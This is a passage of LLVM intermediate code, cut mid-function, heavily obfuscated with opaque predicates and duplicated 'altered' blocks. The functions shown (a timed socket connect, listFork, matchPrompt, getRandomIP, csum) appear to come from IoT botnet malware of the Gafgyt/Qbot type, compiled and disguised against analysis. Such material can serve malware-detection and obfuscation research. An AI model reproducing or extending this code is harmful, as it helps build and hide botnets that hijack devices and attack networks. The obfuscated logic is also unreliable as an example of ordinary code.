  %112 = load i32, i32* %6, align 4
  %113 = srem i32 %112, 64
  %114 = zext i32 %113 to i64
  %115 = shl i64 1, %114
  %116 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %117 = load i32, i32* %6, align 4
  %118 = sdiv i32 %117, 64
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %116, i64 0, i64 %119
  %121 = load i64, i64* %120, align 8
  %122 = or i64 %121, %115
  store i64 %122, i64* %120, align 8
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  %125 = call i32 @select(i32 %124, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %126 = icmp sgt i32 %125, 0
  br i1 %126, label %127, label %151

; <label>:127:                                    ; preds = %111
  store i32 4, i32* %13, align 4
  %128 = load i32, i32* %6, align 4
  %129 = bitcast i32* %14 to i8*
  %130 = call i32 @getsockopt(i32 %128, i32 1, i32 4, i8* %129, i32* %13) #5
  %131 = load i32, i32* %14, align 4
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %133, label %150

; <label>:133:                                    ; preds = %127
  %134 = load i32, i32* @x.45
  %135 = load i32, i32* @y.46
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  store i32 0, i32* %5, align 4
  %142 = load i32, i32* @x.45
  %143 = load i32, i32* @y.46
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %196

; <label>:150:                                    ; preds = %127
  br label %152

; <label>:151:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %196

; <label>:152:                                    ; preds = %150
  br label %170

; <label>:153:                                    ; preds = %originalBBpart24
  %154 = load i32, i32* @x.45
  %155 = load i32, i32* @y.46
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %153
  store i32 0, i32* %5, align 4
  %162 = load i32, i32* @x.45
  %163 = load i32, i32* @y.46
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %196

; <label>:170:                                    ; preds = %152
  br label %171

; <label>:171:                                    ; preds = %170, %53
  %172 = load i32, i32* @x.45
  %173 = load i32, i32* @y.46
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %171
  %180 = load i32, i32* %6, align 4
  %181 = call i32 (i32, i32, ...) @fcntl(i32 %180, i32 3, i8* null)
  %182 = sext i32 %181 to i64
  store i64 %182, i64* %15, align 8
  %183 = load i64, i64* %15, align 8
  %184 = and i64 %183, -2049
  store i64 %184, i64* %15, align 8
  %185 = load i32, i32* %6, align 4
  %186 = load i64, i64* %15, align 8
  %187 = call i32 (i32, i32, ...) @fcntl(i32 %185, i32 4, i64 %186)
  store i32 1, i32* %5, align 4
  %188 = load i32, i32* @x.45
  %189 = load i32, i32* @y.46
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart222, label %originalBB18alteredBB

originalBBpart222:                                ; preds = %originalBB18
  br label %196

; <label>:196:                                    ; preds = %originalBBpart222, %originalBBpart216, %151, %originalBBpart212, %originalBBpart2
  %197 = load i32, i32* %5, align 4
  ret i32 %197

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %198 = call i32* @__errno_location() #10
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, 115
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %201 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %202 = getelementptr inbounds [16 x i64], [16 x i64]* %201, i64 0, i64 0
  %203 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %202) #5, !srcloc !4
  %204 = extractvalue { i64, i64* } %203, 0
  %205 = extractvalue { i64, i64* } %203, 1
  %206 = trunc i64 %204 to i32
  store i32 %206, i32* %17, align 4
  %207 = ptrtoint i64* %205 to i64
  %208 = trunc i64 %207 to i32
  store i32 %208, i32* %18, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  store i32 0, i32* %5, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %153
  store i32 0, i32* %5, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %171
  %209 = load i32, i32* %6, align 4
  %210 = call i32 (i32, i32, ...) @fcntl(i32 %209, i32 3, i8* null)
  %211 = sext i32 %210 to i64
  store i64 %211, i64* %15, align 8
  %212 = load i64, i64* %15, align 8
  %_ = sub i64 %212, -2049
  %gen = mul i64 %_, -2049
  %_19 = sub i64 %212, -2049
  %gen20 = mul i64 %_19, -2049
  %213 = and i64 %212, -2049
  store i64 %213, i64* %15, align 8
  %214 = load i32, i32* %6, align 4
  %215 = load i64, i64* %15, align 8
  %216 = call i32 (i32, i32, ...) @fcntl(i32 %214, i32 4, i64 %215)
  store i32 1, i32* %5, align 4
  br label %originalBB18
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = load i32, i32* @x.47
  %2 = load i32, i32* @y.48
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = call i32 @fork() #5
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %10, align 4
  %15 = icmp ule i32 %14, 0
  %16 = load i32, i32* @x.47
  %17 = load i32, i32* @y.48
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %26

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %10, align 4
  store i32 %25, i32* %9, align 4
  br label %111

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.47
  %28 = load i32, i32* @y.48
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i64, i64* @numpids, align 8
  %36 = add i64 %35, 1
  store i64 %36, i64* @numpids, align 8
  %37 = load i64, i64* @numpids, align 8
  %38 = add i64 %37, 1
  %39 = mul i64 %38, 4
  %40 = call noalias i8* @malloc(i64 %39) #5
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %11, align 8
  store i32 0, i32* %12, align 4
  %42 = load i32, i32* @x.47
  %43 = load i32, i32* @y.48
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart225, label %originalBB1alteredBB

originalBBpart225:                                ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart238, %originalBBpart225
  %51 = load i32, i32* %12, align 4
  %52 = zext i32 %51 to i64
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 %53, 1
  %55 = icmp ult i64 %52, %54
  br i1 %55, label %56, label %101

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* @x.47
  %58 = load i32, i32* @y.48
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %56
  %65 = load i32*, i32** @pids, align 8
  %66 = load i32, i32* %12, align 4
  %67 = zext i32 %66 to i64
  %68 = getelementptr inbounds i32, i32* %65, i64 %67
  %69 = load i32, i32* %68, align 4
  %70 = load i32*, i32** %11, align 8
  %71 = load i32, i32* %12, align 4
  %72 = zext i32 %71 to i64
  %73 = getelementptr inbounds i32, i32* %70, i64 %72
  store i32 %69, i32* %73, align 4
  %74 = load i32, i32* @x.47
  %75 = load i32, i32* @y.48
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %82

; <label>:82:                                     ; preds = %originalBBpart229
  %83 = load i32, i32* @x.47
  %84 = load i32, i32* @y.48
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %82
  %91 = load i32, i32* %12, align 4
  %92 = add i32 %91, 1
  store i32 %92, i32* %12, align 4
  %93 = load i32, i32* @x.47
  %94 = load i32, i32* @y.48
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart238, label %originalBB31alteredBB

originalBBpart238:                                ; preds = %originalBB31
  br label %50

; <label>:101:                                    ; preds = %50
  %102 = load i32, i32* %10, align 4
  %103 = load i32*, i32** %11, align 8
  %104 = load i64, i64* @numpids, align 8
  %105 = sub i64 %104, 1
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  store i32 %102, i32* %106, align 4
  %107 = load i32*, i32** @pids, align 8
  %108 = bitcast i32* %107 to i8*
  call void @free(i8* %108) #5
  %109 = load i32*, i32** %11, align 8
  store i32* %109, i32** @pids, align 8
  %110 = load i32, i32* %10, align 4
  store i32 %110, i32* %9, align 4
  br label %111

; <label>:111:                                    ; preds = %101, %24
  %112 = load i32, i32* %9, align 4
  ret i32 %112

originalBBalteredBB:                              ; preds = %originalBB, %0
  %113 = alloca i32, align 4
  %114 = alloca i32, align 4
  %115 = alloca i32*, align 8
  %116 = alloca i32, align 4
  %117 = call i32 @fork() #5
  store i32 %117, i32* %114, align 4
  %118 = load i32, i32* %114, align 4
  %119 = icmp ule i32 %118, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %120 = load i64, i64* @numpids, align 8
  %_ = shl i64 %120, 1
  %_2 = sub i64 0, %120
  %gen = add i64 %_2, 1
  %_3 = sub i64 %120, 1
  %gen4 = mul i64 %_3, 1
  %_5 = sub i64 %120, 1
  %gen6 = mul i64 %_5, 1
  %_7 = sub i64 %120, 1
  %gen8 = mul i64 %_7, 1
  %_9 = sub i64 %120, 1
  %gen10 = mul i64 %_9, 1
  %_11 = sub i64 0, %120
  %gen12 = add i64 %_11, 1
  %121 = add i64 %120, 1
  store i64 %121, i64* @numpids, align 8
  %122 = load i64, i64* @numpids, align 8
  %_13 = sub i64 %122, 1
  %gen14 = mul i64 %_13, 1
  %123 = add i64 %122, 1
  %_15 = shl i64 %123, 4
  %_16 = shl i64 %123, 4
  %_17 = sub i64 0, %123
  %gen18 = add i64 %_17, 4
  %_19 = sub i64 %123, 4
  %gen20 = mul i64 %_19, 4
  %_21 = shl i64 %123, 4
  %_22 = sub i64 0, %123
  %gen23 = add i64 %_22, 4
  %124 = mul i64 %123, 4
  %125 = call noalias i8* @malloc(i64 %124) #5
  %126 = bitcast i8* %125 to i32*
  store i32* %126, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %originalBB1

originalBB27alteredBB:                            ; preds = %originalBB27, %56
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %12, align 4
  %129 = zext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %127, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = load i32*, i32** %11, align 8
  %133 = load i32, i32* %12, align 4
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  store i32 %131, i32* %135, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %82
  %136 = load i32, i32* %12, align 4
  %_32 = sub i32 %136, 1
  %gen33 = mul i32 %_32, 1
  %_34 = sub i32 0, %136
  %gen35 = add i32 %_34, 1
  %_36 = shl i32 %136, 1
  %137 = add i32 %136, 1
  store i32 %137, i32* %12, align 4
  br label %originalBB31
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.49
  %3 = load i32, i32* @y.50
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.49
  %20 = load i32, i32* @y.50
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %161, %originalBBpart2
  %28 = load i32, i32* @x.49
  %29 = load i32, i32* @y.50
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = load i32, i32* %14, align 4
  %37 = sext i32 %36 to i64
  %38 = load i8*, i8** %12, align 8
  %39 = call i64 @strlen(i8* %38) #9
  %40 = icmp ult i64 %37, %39
  %41 = load i32, i32* @x.49
  %42 = load i32, i32* @y.50
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %40, label %49, label %164

; <label>:49:                                     ; preds = %originalBBpart24
  %50 = load i32, i32* @x.49
  %51 = load i32, i32* @y.50
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i32, i32* @x.49
  %59 = load i32, i32* @y.50
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %66

; <label>:66:                                     ; preds = %138, %originalBBpart28
  %67 = load i32, i32* %13, align 4
  %68 = load i32, i32* %15, align 4
  %69 = icmp sgt i32 %67, %68
  br i1 %69, label %70, label %120

; <label>:70:                                     ; preds = %66
  %71 = load i8*, i8** %11, align 8
  %72 = load i32, i32* %13, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %15, align 4
  %76 = sext i32 %75 to i64
  %77 = sub i64 0, %76
  %78 = getelementptr inbounds i8, i8* %74, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %118, label %82

; <label>:82:                                     ; preds = %70
  %83 = load i8*, i8** %11, align 8
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i32, i32* %15, align 4
  %88 = sext i32 %87 to i64
  %89 = sub i64 0, %88
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 32
  br i1 %93, label %118, label %94

; <label>:94:                                     ; preds = %82
  %95 = load i8*, i8** %11, align 8
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = load i32, i32* %15, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 0, %100
  %102 = getelementptr inbounds i8, i8* %98, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = icmp eq i32 %104, 13
  br i1 %105, label %118, label %106

; <label>:106:                                    ; preds = %94
  %107 = load i8*, i8** %11, align 8
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32, i32* %15, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 0, %112
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 10
  br label %118

; <label>:118:                                    ; preds = %106, %94, %82, %70
  %119 = phi i1 [ true, %94 ], [ true, %82 ], [ true, %70 ], [ %117, %106 ]
  br label %120

; <label>:120:                                    ; preds = %118, %66
  %121 = phi i1 [ false, %66 ], [ %119, %118 ]
  %122 = load i32, i32* @x.49
  %123 = load i32, i32* @y.50
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %130 = load i32, i32* @x.49
  %131 = load i32, i32* @y.50
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %121, label %138, label %141

; <label>:138:                                    ; preds = %originalBBpart212
  %139 = load i32, i32* %15, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %15, align 4
  br label %66

; <label>:141:                                    ; preds = %originalBBpart212
  %142 = load i8*, i8** %11, align 8
  %143 = load i32, i32* %13, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  %146 = load i32, i32* %15, align 4
  %147 = sext i32 %146 to i64
  %148 = sub i64 0, %147
  %149 = getelementptr inbounds i8, i8* %145, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = load i8*, i8** %12, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp eq i32 %151, %157
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %141
  store i32 1, i32* %10, align 4
  br label %165

; <label>:160:                                    ; preds = %141
  br label %161

; <label>:161:                                    ; preds = %160
  %162 = load i32, i32* %14, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %14, align 4
  br label %27

; <label>:164:                                    ; preds = %originalBBpart24
  store i32 0, i32* %10, align 4
  br label %165

; <label>:165:                                    ; preds = %164, %159
  %166 = load i32, i32* @x.49
  %167 = load i32, i32* @y.50
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %165
  %174 = load i32, i32* %10, align 4
  %175 = load i32, i32* @x.49
  %176 = load i32, i32* @y.50
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %174

originalBBalteredBB:                              ; preds = %originalBB, %1
  %183 = alloca i32, align 4
  %184 = alloca i8*, align 8
  %185 = alloca i8*, align 8
  %186 = alloca i32, align 4
  %187 = alloca i32, align 4
  %188 = alloca i32, align 4
  store i8* %0, i8** %184, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8** %185, align 8
  %189 = load i8*, i8** %184, align 8
  %190 = call i64 @strlen(i8* %189) #9
  %191 = trunc i64 %190 to i32
  store i32 %191, i32* %186, align 4
  store i32 0, i32* %188, align 4
  store i32 0, i32* %187, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %192 = load i32, i32* %14, align 4
  %193 = sext i32 %192 to i64
  %194 = load i8*, i8** %12, align 8
  %195 = call i64 @strlen(i8* %194) #9
  %196 = icmp ult i64 %193, %195
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %165
  %197 = load i32, i32* %10, align 4
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.53
  %4 = load i32, i32* @y.54
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.53
  %15 = load i32, i32* @y.54
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %25, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %34

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  %32 = load i32, i32* %12, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %12, align 4
  br label %22

; <label>:34:                                     ; preds = %22
  %35 = load i32, i32* %12, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %60

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* @x.53
  %39 = load i32, i32* @y.54
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i16*, i16** %11, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i64
  %50 = load i64, i64* %13, align 8
  %51 = add i64 %50, %49
  store i64 %51, i64* %13, align 8
  %52 = load i32, i32* @x.53
  %53 = load i32, i32* @y.54
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br label %60

; <label>:60:                                     ; preds = %originalBBpart214, %34
  br label %61

; <label>:61:                                     ; preds = %originalBBpart237, %60
  %62 = load i64, i64* %13, align 8
  %63 = lshr i64 %62, 16
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %87

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @x.53
  %67 = load i32, i32* @y.54
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %65
  %74 = load i64, i64* %13, align 8
  %75 = and i64 %74, 65535
  %76 = load i64, i64* %13, align 8
  %77 = lshr i64 %76, 16
  %78 = add i64 %75, %77
  store i64 %78, i64* %13, align 8
  %79 = load i32, i32* @x.53
  %80 = load i32, i32* @y.54
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart237, label %originalBB16alteredBB

originalBBpart237:                                ; preds = %originalBB16
  br label %61

; <label>:87:                                     ; preds = %61
  %88 = load i64, i64* %13, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %2
  %91 = alloca i16*, align 8
  %92 = alloca i32, align 4
